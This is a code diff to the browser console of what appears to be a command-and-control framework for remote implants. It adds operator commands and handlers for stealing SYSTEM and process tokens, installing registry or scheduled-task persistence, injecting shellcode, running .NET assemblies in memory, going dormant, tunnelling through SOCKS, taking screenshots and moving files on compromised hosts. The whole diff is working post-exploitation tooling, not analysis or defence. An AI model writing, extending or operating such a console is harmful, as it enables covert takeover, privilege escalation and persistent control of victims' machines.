@@ -228,6 +228,13 @@
                 if (consoleTabs[data.agent_id]) {
                     if (isInternal) {
                         if (data.output && String(data.output).indexOf('HDIMG:') === 0) showDesktopFrame(data.agent_id, data.output);
+                        if (cmdStr2.indexOf('__fs:ls:') === 0) {
+                            var fsPath = cmdStr2.slice(8);
+                            showFileList(data.agent_id, fsPath);
+                        }
+                        if (cmdStr2.indexOf('__px:screenshot') === 0 && data.output) {
+                            appendConsole(data.agent_id, '[+] Screenshot captured (' + data.output.length + ' bytes)', 'output');
+                        }
                     } else if (data.output && String(data.output).indexOf('HDIMG') !== 0) {
                         if (isBof) {
                             appendConsole(data.agent_id, '[BOF] ' + data.output, 'output');
@@ -683,20 +690,35 @@
         '  <any command>      Execute via cmd.exe / sh',
         '  cd <dir>           Change working directory',
         '',
-        'Same as the terminal:',
-        '  desktop <action>   Hidden desktop (start, frame, click x y, type, key)',
-        '  bof                Run a Beacon Object File (opens picker)',
+        'File operations:',
         '  ls <path>          List a directory',
         '  get <path>         Download a file',
         '  put <remote>       Upload a local file (opens a picker)',
+        '  upload <remote>    Upload a local file (opens a picker)',
+        '  download <path>    Download a remote file',
+        '',
+        'Post-exploitation:',
+        '  screenshot         Capture screenshot',
+        '  getsystem          Steal SYSTEM token (Windows)',
+        '  rev2self           Revert to original token',
+        '  steal_token <PID>  Impersonate process token',
+        '  make_token u p     Create token with creds',
+        '  persist [method]   Install persistence (reg/schtask/remove)',
+        '  shinject <path>    Inject shellcode from .bin file',
+        '  execute-assembly   Run .NET assembly (opens a picker)',
+        '  bof                Run a Beacon Object File (opens picker)',
+        '  dormant <duration> Sleep for hours (e.g. 2h, 30m)',
+        '',
+        'Desktop:',
+        '  desktop <action>   Hidden desktop (start, frame, click x y, type, key)',
         '',
         'Agent control:',
-        '  __kill             Terminate agent process',
-        '  __sleep <secs>     Set beacon interval',
-        '',
-        'Keys (when not typing):',
-        '  F1 help  F2 generate  F5 refresh',
-        '  k kill  s sleep  u upgrade  d downgrade  p socks  h desktop',
+        '  sleep <secs>       Set beacon interval',
+        '  socks <port>       Start SOCKS proxy',
+        '  stopsocks          Stop SOCKS proxy',
+        '  upgrade            Switch to streaming mode',
+        '  downgrade [secs]   Switch to beacon mode',
+        '  kill               Terminate agent process',
         '',
         '  help               Show this help',
         '  clear              Clear console output',
@@ -730,6 +752,122 @@
             command = '__px:token:make_token ' + command.slice(11);
         } else if (cmdLower.indexOf('download ') === 0) {
             command = '__px:download:' + command.slice(9);
+        } else if (cmdLower.indexOf('persist') === 0) {
+            var persistArgs = command.length > 8 ? command.slice(8).trim() : '';
+            try {
+                var r = await api('POST', '/agents/' + agentId + '/persist', { method: persistArgs });
+                appendConsole(agentId, r.output || r.message || JSON.stringify(r), r.queued ? 'info' : 'output');
+            } catch(e) { appendConsole(agentId, 'Error: ' + e.message, 'error'); }
+            return;
+        } else if (cmdLower === 'shinject' || cmdLower.indexOf('shinject ') === 0) {
+            var scPicker = document.createElement('input');
+            scPicker.type = 'file';
+            scPicker.accept = '.bin,.raw,.sc';
+            scPicker.onchange = async function() {
+                var file = scPicker.files && scPicker.files[0];
+                if (!file) return;
+                var reader = new FileReader();
+                reader.onload = async function() {
+                    var b64 = String(reader.result).split(',')[1] || '';
+                    appendConsole(agentId, '[*] Injecting shellcode: ' + file.name, 'info');
+                    try {
+                        var r = await api('POST', '/agents/' + agentId + '/shinject', { shellcode_b64: b64 });
+                        appendConsole(agentId, r.output || r.message || JSON.stringify(r), r.queued ? 'info' : 'output');
+                    } catch(e) { appendConsole(agentId, 'Error: ' + e.message, 'error'); }
+                };
+                reader.readAsDataURL(file);
+            };
+            scPicker.click();
+            return;
+        } else if (cmdLower === 'execute-assembly' || cmdLower.indexOf('execute-assembly ') === 0) {
+            var asmPicker = document.createElement('input');
+            asmPicker.type = 'file';
+            asmPicker.accept = '.exe,.dll';
+            asmPicker.onchange = async function() {
+                var file = asmPicker.files && asmPicker.files[0];
+                if (!file) return;
+                var reader = new FileReader();
+                reader.onload = async function() {
+                    var b64 = String(reader.result).split(',')[1] || '';
+                    var asmArgs = command.length > 17 ? command.slice(17).trim() : '';
+                    appendConsole(agentId, '[*] Loading assembly: ' + file.name + (asmArgs ? ' args: ' + asmArgs : ''), 'info');
+                    try {
+                        var r = await api('POST', '/agents/' + agentId + '/execute-assembly', { assembly_b64: b64, args: asmArgs });
+                        appendConsole(agentId, r.output || r.message || JSON.stringify(r), r.queued ? 'info' : 'output');
+                    } catch(e) { appendConsole(agentId, 'Error: ' + e.message, 'error'); }
+                };
+                reader.readAsDataURL(file);
+            };
+            asmPicker.click();
+            return;
+        } else if (cmdLower.indexOf('dormant ') === 0) {
+            var duration = command.slice(8).trim();
+            try {
+                var r = await api('POST', '/agents/' + agentId + '/dormant', { duration: duration });
+                appendConsole(agentId, r.output || r.message || JSON.stringify(r), r.queued ? 'info' : 'output');
+            } catch(e) { appendConsole(agentId, 'Error: ' + e.message, 'error'); }
+            return;
+        } else if (cmdLower === 'upload' || cmdLower.indexOf('upload ') === 0) {
+            var uploadRemote = command.length > 7 ? command.slice(7).trim() : '';
+            var upPicker = document.createElement('input');
+            upPicker.type = 'file';
+            upPicker.onchange = function() {
+                var file = upPicker.files && upPicker.files[0];
+                if (!file) return;
+                var reader = new FileReader();
+                reader.onload = function() {
+                    var b64 = String(reader.result).split(',')[1] || '';
+                    sendCommand(agentId, '__px:upload:' + (uploadRemote || file.name) + ':' + b64);
+                };
+                reader.readAsDataURL(file);
+            };
+            upPicker.click();
+            return;
+        } else if (cmdLower.indexOf('sleep ') === 0) {
+            var interval = parseInt(command.slice(6));
+            if (isNaN(interval)) { appendConsole(agentId, 'Usage: sleep <seconds>', 'error'); return; }
+            try {
+                var r = await api('POST', '/agents/' + agentId + '/sleep', { interval: interval });
+                appendConsole(agentId, r.message || JSON.stringify(r), 'info');
+            } catch(e) { appendConsole(agentId, 'Error: ' + e.message, 'error'); }
+            return;
+        } else if (cmdLower.indexOf('socks ') === 0 && cmdLower !== 'stopsocks') {
+            var socksParts = command.split(/\s+/);
+            var socksPort = parseInt(socksParts[1]);
+            if (isNaN(socksPort)) { appendConsole(agentId, 'Usage: socks <port> [user pass]', 'error'); return; }
+            var socksData = { port: socksPort };
+            if (socksParts[2]) socksData.user = socksParts[2];
+            if (socksParts[3]) socksData.password = socksParts[3];
+            try {
+                var r = await api('POST', '/agents/' + agentId + '/socks', socksData);
+                appendConsole(agentId, r.message || JSON.stringify(r), 'info');
+            } catch(e) { appendConsole(agentId, 'Error: ' + e.message, 'error'); }
+            return;
+        } else if (cmdLower === 'stopsocks') {
+            try {
+                var r = await api('DELETE', '/agents/' + agentId + '/socks');
+                appendConsole(agentId, r.message || JSON.stringify(r), 'info');
+            } catch(e) { appendConsole(agentId, 'Error: ' + e.message, 'error'); }
+            return;
+        } else if (cmdLower === 'upgrade') {
+            try {
+                var r = await api('POST', '/agents/' + agentId + '/upgrade');
+                appendConsole(agentId, r.message || JSON.stringify(r), 'info');
+            } catch(e) { appendConsole(agentId, 'Error: ' + e.message, 'error'); }
+            return;
+        } else if (cmdLower === 'downgrade' || cmdLower.indexOf('downgrade ') === 0) {
+            var dgInterval = cmdLower.indexOf(' ') > 0 ? parseInt(command.split(/\s+/)[1]) : 60;
+            try {
+                var r = await api('POST', '/agents/' + agentId + '/downgrade', { interval: dgInterval || 60 });
+                appendConsole(agentId, r.message || JSON.stringify(r), 'info');
+            } catch(e) { appendConsole(agentId, 'Error: ' + e.message, 'error'); }
+            return;
+        } else if (cmdLower === 'kill') {
+            try {
+                var r = await api('POST', '/agents/' + agentId + '/kill');
+                appendConsole(agentId, r.message || JSON.stringify(r), 'info');
+            } catch(e) { appendConsole(agentId, 'Error: ' + e.message, 'error'); }
+            return;
         } else if (command.indexOf('desktop ') === 0) {
             command = '__hd:' + command.slice(8);
         } else if (command === 'desktop') {
@@ -966,7 +1104,7 @@
         var poll = setInterval(function() {
             attempts++;
             showFileList(agentId, path).then(function(found) {
-                if (found || attempts >= 10) clearInterval(poll);
+                if (found || attempts >= 35) clearInterval(poll);
             });
         }, 2000);
     }
